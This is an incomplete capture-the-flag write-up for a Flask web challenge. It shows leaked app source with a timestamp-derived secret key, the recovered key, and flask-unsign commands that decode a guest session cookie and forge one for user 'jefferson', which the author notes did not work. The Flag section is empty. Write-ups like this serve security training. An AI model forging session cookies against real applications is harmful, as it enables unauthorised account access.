# Thomas DEVerson
All things considered, I'm impressed this website is still up and running 200 years later.

# Flag

# Solution

Viewing source code, there is a `/backup` page:

```
---------- command output: {head -n 10 app.py} ----------

from flask import (Flask, flash, redirect, render_template, request, send_from_directory, session, url_for)
from datetime import datetime

app = Flask(__name__)

c = datetime.now()
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'

allowed_users = ['Jefferson', 'Madison', 'Burr'] # No Federalists Allowed!!!!

---------- command output: {head -n 10 requirements.txt} ----------

Flask==3.0.3
```

See `req.py` to obtain the app secret key:
```
THE_REYNOLDS_PAMPHLET-179708251645
```

Session Manipulation:
```bash
flask-unsign --decode --cookie 'eyJuYW1lIjoiZ3Vlc3QifQ.Zk-_xg.1LzY-qUyYbn726AxGD-YZuBrnts'
# {'name': 'guest'}

flask-unsign --sign --cookie "{'name': 'jefferson'}" --secret 'THE_REYNOLDS_PAMPHLET-179708251645'
# eyJuYW1lIjoiamVmZmVyc29uIn0.Zk_ClQ.7S5B847Pp8I6JgVy7aaiytWQWHc
# not working ^^
```